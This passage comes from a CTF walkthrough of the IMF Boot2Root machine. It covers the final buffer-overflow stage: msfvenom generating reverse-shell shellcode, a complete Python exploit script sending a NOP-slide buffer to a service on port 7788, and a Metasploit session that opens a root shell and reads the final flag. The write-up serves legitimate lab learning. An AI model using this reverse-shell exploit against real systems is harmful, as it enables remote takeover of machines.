    <div>0xffde7ebc:Â Â Â Â Â 0x0a048991Â Â Â Â Â Â 0xf7f55560Â Â Â Â Â Â 0xffde7ee0Â Â Â Â Â Â 0x00000000</div>
    <div>0xffde7ecc:Â Â Â Â Â 0xf7d52b41Â Â Â Â Â Â 0xf7f12000Â Â Â Â Â Â 0xf7f12000Â Â Â Â Â Â 0x00000000</div>
    <div>0xffde7edc:Â Â Â Â Â 0xf7d52b41Â Â Â Â Â Â 0x00000001Â Â Â Â Â Â 0xffde7f74Â Â Â Â Â Â 0xffde7f7c</div>
</div>
<div><br /></div>
<div>It looks like our process died when it hit those 4 bytes in the buffer that broke up our 'A's. You can see that after our 'A's we have our eip. Interestingly, it is a few bytes off of what we tried to set it to (0x08048565 vsÂ 0x08048563). Subsequent runs produced similar results. We'll go forward with our exploit, but it might be inconsistent.</div>
<div><br /></div>
<div>We'll generate ourÂ linux/x86/shell_reverse_tcp payload using msfvenom, being sure to exclude our bad characters (\x00\x0a).</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>root@kali:~/Walkthroughs/imf# msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.183.0.222 LPORT=5434 -a x86 -b '\x00\x0a' -f c</div>
    <div>[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload</div>
    <div>Found 11 compatible encoders</div>
    <div>Attempting to encode payload with 1 iterations of x86/shikata_ga_nai</div>
    <div>x86/shikata_ga_nai succeeded with size 95 (iteration=0)</div>
    <div>x86/shikata_ga_nai chosen with final size 95</div>
    <div>Payload size: 95 bytes</div>
    <div>Final size of c file: 425 bytes</div>
    <div>unsigned char buf[] = </div>
    <div>"\xba\xb9\xdd\x5d\x4a\xd9\xc1\xd9\x74\x24\xf4\x5e\x33\xc9\xb1"</div>
    <div>"\x12\x83\xc6\x04\x31\x56\x0e\x03\xef\xd3\xbf\xbf\x3e\x37\xc8"</div>
    <div>"\xa3\x13\x84\x64\x4e\x91\x83\x6a\x3e\xf3\x5e\xec\xac\xa2\xd0"</div>
    <div>"\xd2\x1f\xd4\x58\x54\x59\xbc\x50\x11\x99\xe2\x0d\x5f\x9a\x0f"</div>
    <div>"\xf4\xd6\x7b\x9f\x6e\xb9\x2a\x8c\xdd\x3a\x44\xd3\xef\xbd\x04"</div>
    <div>"\x7b\x9e\x92\xdb\x13\x36\xc2\x34\x81\xaf\x95\xa8\x17\x63\x2f"</div>
    <div>"\xcf\x27\x88\xe2\x90";</div>
</div>
<div><br /></div>
<div>Our payload is 95 bytes, which should be plenty of room for us. Our final, weaponized, python script becomes...</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>root@kali:~/Walkthroughs/imf# cat sock-remote.py</div>
    <div>#!/usr/bin/python</div>
    <div>import socket</div>
    <div>import time</div>
    <div><br /></div>
    <div>s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)</div>
    <div>
        <div><br /></div>
    </div>
    <div># bad chars</div>
    <div># \x00\x0a</div>
    <div>
        <div><br /></div>
    </div>
    <div># payload = linux/x86/shell_reverse_tcp LHOST=10.183.0.222 LPORT=5434</div>
    <div># payload = 95 bytes</div>
    <div>payload = ("\xbe\x58\x8c\x3a\x4b\xda\xcd\xd9\x74\x24\xf4\x5b\x2b\xc9\xb1"</div>
    <div>"\x12\x83\xeb\xfc\x31\x73\x0e\x03\x2b\x82\xd8\xbe\xfa\x41\xeb"</div>
    <div>"\xa2\xaf\x36\x47\x4f\x4d\x30\x86\x3f\x37\x8f\xc9\xd3\xee\xbf"</div>
    <div>"\xf5\x1e\x90\x89\x70\x58\xf8\x03\x34\x9a\x26\x7b\x38\x9b\xc3"</div>
    <div>"\x46\xb5\x7a\x5b\xd0\x95\x2d\xc8\xae\x15\x47\x0f\x1d\x99\x05"</div>
    <div>"\xa7\xf0\xb5\xda\x5f\x65\xe5\x33\xfd\x1c\x70\xa8\x53\x8c\x0b"</div>
    <div>"\xce\xe3\x39\xc1\x91");</div>
    <div>
        <div><br /></div>
    </div>
    <div># nop slide</div>
    <div>nop_slide = "\x90" * (168-95)</div>
    <div>
        <div><br /></div>
    </div>
    <div># CALL EAX address = 0x08048563 = \x08\x04\x85\x63</div>
    <div># Because of Little Endian, we need to reverse the address to \x63\x85\x04\x08</div>
    <div>call_eax = "\x63\x85\x04\x08"</div>
    <div>
        <div><br /></div>
    </div>
    <div>buffer = payload + nop_slide + call_eax</div>
    <div>
        <div><br /></div>
    </div>
    <div>try:</div>
    <div>Â Â print "Sending evil buffer..."</div>
    <div>Â Â s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)</div>
    <div>Â Â s.settimeout(2)</div>
    <div>Â Â s.connect(('10.183.0.188',7788))</div>
    <div>Â Â s.recv(1024)</div>
    <div>Â Â time.sleep(10)</div>
    <div>Â Â s.send('48093572' + '\n')</div>
    <div>Â Â s.recv(1024)</div>
    <div>Â Â s.send('3' + '\n')</div>
    <div>Â Â s.send(buffer + '\n')</div>
    <div>Â Â print "Done!"</div>
    <div>except:</div>
    <div>Â Â print "Could not connect to TCP port 7788"</div>
</div>
<div><br /></div>
<div>We'll start our listener in Metasploit and give it a try...</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>msf5 exploit(multi/handler) &gt; [*] Command shell session 5 opened (10.183.0.222:5434 -&gt; 10.183.0.188:46694) at 2019-05-05 02:44:02 -0400</div>
    <div>
        <div><br /></div>
    </div>
    <div>msf5 exploit(multi/handler) &gt; sessions 5</div>
    <div>[*] Starting interaction with 5...</div>
    <div>
        <div><br /></div>
    </div>
    <div>pwd</div>
    <div>/</div>
    <div>id</div>
    <div>uid=0(root) gid=0(root) groups=0(root)</div>
    <div>cd /root</div>
    <div>ls</div>
    <div>Flag.txt</div>
    <div>TheEnd.txt</div>
    <div>cat Flag.txt</div>
    <div>
        <font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">flag6{R2gwc3RQcm90MGMwbHM=}</font>
    </div>
    <div>cat TheEnd.txt</div>
    <div>Â Â Â ____Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â _ __Â Â Â __Â Â Â </div>
    <div>Â Â /Â Â _/_ _Â Â ___Â Â ___Â Â ___ ___ (_) /Â Â / /__ </div>
    <div> _/ //Â Â ' \/ _ \/ _ \(_-&lt;(_-&lt;/ / _ \/ / -_)</div>
    <div>/___/_/_/_/ .__/\___/___/___/_/_.__/_/\__/ </div>
    <div>Â Â Â __Â Â __/_/Â Â Â Â Â Â Â Â _Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â </div>
    <div>Â Â /Â Â |/Â Â (_)__ ___ (_)__Â Â ___Â Â Â Â Â Â Â Â Â Â Â Â Â Â </div>
    <div> / /|_/ / (_-&lt;(_-&lt;/ / _ \/ _ \Â Â Â Â Â Â Â Â Â Â Â Â Â </div>
    <div>/_/__/_/_/___/___/_/\___/_//_/Â Â Â Â Â Â Â Â Â Â Â Â Â </div>
    <div>Â Â / __/__Â Â ___________Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â </div>
    <div> / _// _ \/ __/ __/ -_)Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â </div>
    <div>/_/Â Â \___/_/Â Â \__/\__/Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â </div>
    <div>Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â </div>
    <div>Congratulations on finishing the IMF Boot2Root CTF. I hope you enjoyed it.</div>
    <div>Thank you for trying this challenge and please send any feedback.</div>
    <div>
        <div><br /></div>
    </div>
    <div>Geckom</div>
    <div>Twitter: @g3ck0ma</div>
    <div>Email: geckom@redteamr.com</div>
    <div>Web: http://redteamr.com</div>
    <div>
        <div><br /></div>
    </div>
    <div>Special Thanks</div>
    <div>Binary Advice: OJ (@TheColonial) and Justin Stevens (@justinsteven)</div>
    <div>Web Advice: Menztrual (@menztrual)</div>
    <div>Testers: dook (@dooktwit), Menztrual (@menztrual), llid3nlq and OJ(@TheColonial)</div>
</div>
<div><br /></div>
<div>And the final Base64 string in the flag decodes to 'Gh0stProt0c0ls'.</div>
<div><br /></div>
<div><br /></div>
<div>
    <h2>Pivoting</h2>
</div>
<div>N/A</div>
<div><br /></div>
<div>
    <h2>Clean Up</h2>
</div>
<div><br /></div>
<div>*** STOP /var/www/html/imfadministrator/uploads/89141121ca4e.jpg ***</div>
<div>*** REMOVE /var/www/html/imfadministrator/uploads/89141121ca4e.jpg ***</div>
<div><br /></div>
<div><br /></div>
<div>
    <h2>Additional Info</h2>
</div>
<div><br /></div>
<div><b>gdb-peda</b></div>
<div><br /></div>
<div>I spent a LOT of time in gdb working through the buffer overflow (due to the inconsistent results and a bad testing set up before just using netcat and sockets). Along the way, I came acrossÂ gdb-peda, which adds some nice features to gdb (especially for exploit development). After installingÂ gdb-peda (apt-get install gdb-peda), you can enable it by putting the following in your ~/.gdbinit file.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>root@kali:~/Walkthroughs/imf# cat ~/.gdbinit </div>
    <div>
        <font style="color: rgb(147, 255, 5); --inversion-type-color: simple;"># Source all settings from the peda dir</font>
    </div>
    <div>
        <font style="color: rgb(147, 255, 5); --inversion-type-color: simple;">source /usr/share/gdb-peda/peda.py</font>
    </div>
    <div>
        <div><br /></div>
    </div>
    <div># Intel syntax is more readable</div>
    <div>set disassembly-flavor intel</div>
    <div></div>
    <div># When inspecting large portions of code the scrollbar works better than 'less'</div>
    <div>set pagination off</div>
    <div></div>
    <div># Keep a history of all the commands typed. Search is possible using ctrl-r</div>
    <div>set history save on</div>
    <div>set history filename ~/.gdb_history</div>
    <div>set history size 32768</div>
    <div>set history expansion on</div>
    <div>
        <div><br /></div>
    </div>
    <div># Don't prompt to confirm quit</div>
    <div>define hook-quit</div>
    <div>Â Â Â Â set confirm off</div>
    <div>end</div>
</div>
<div><br /></div>
<div><br /></div>